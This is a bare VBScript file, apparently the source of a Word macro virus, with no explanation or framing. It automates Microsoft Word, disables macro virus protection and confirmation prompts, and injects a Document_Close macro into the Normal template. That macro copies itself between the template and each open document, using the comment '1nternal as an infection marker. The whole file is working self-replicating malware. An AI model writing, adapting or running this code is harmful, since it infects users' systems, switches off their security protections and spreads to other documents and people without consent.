Dim objWord
Set objWord = WScript.CreateObject("Word.Application")
Set NT = objWord.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
objWord.Options.SaveNormalPrompt = False
objWord.Options.VirusProtection = False
NT.InsertLines 1, "Private Sub Document_Close()"
NT.InsertLines 2, "'1nternal"
NT.InsertLines 3, "On Error GoTo Break"
NT.InsertLines 4, "Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule"
NT.InsertLines 5, "Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule"
NT.InsertLines 6, "Options.VirusProtection = False"
NT.InsertLines 7, "Options.ConfirmConversions = False"
NT.InsertLines 8, "Options.SaveNormalPrompt = False"
NT.InsertLines 9, "If N.Lines(2, 1) = " + Chr(34) + "'1nternal" + Chr(34) + " Then GoTo CheckA"
NT.InsertLines 10, "For I = 1 To 19"
NT.InsertLines 11, "N.InsertLines I, A.Lines(I, 1)"
NT.InsertLines 12, "Next I"
NT.InsertLines 13, "CheckA:"
NT.InsertLines 14, "If A.Lines(2, 1) = " + Chr(34) + "'1nternal" + Chr(34) + " Then GoTo Break"
NT.InsertLines 15, "For I = 1 To 19"
NT.InsertLines 16, "A.InsertLines I, N.Lines(I, 1)"
NT.InsertLines 17, "Next I"
NT.InsertLines 18, "Break:"
NT.InsertLines 19, "End Sub"
objWord.Quit(wdSaveChanges)
WScript.Quit
